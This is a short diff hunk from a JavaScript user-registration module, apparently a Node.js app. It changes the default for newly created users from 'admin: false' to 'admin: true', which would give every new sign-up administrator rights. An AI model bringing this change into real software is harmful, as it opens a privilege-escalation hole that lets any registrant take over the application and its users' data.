@@ -224,7 +224,7 @@ module.exports = async waw => {
 		user = new User();
 
 		user.is = {
-			admin: false
+			admin: true
 		};
 
 		user.email = req.body.email.toLowerCase();
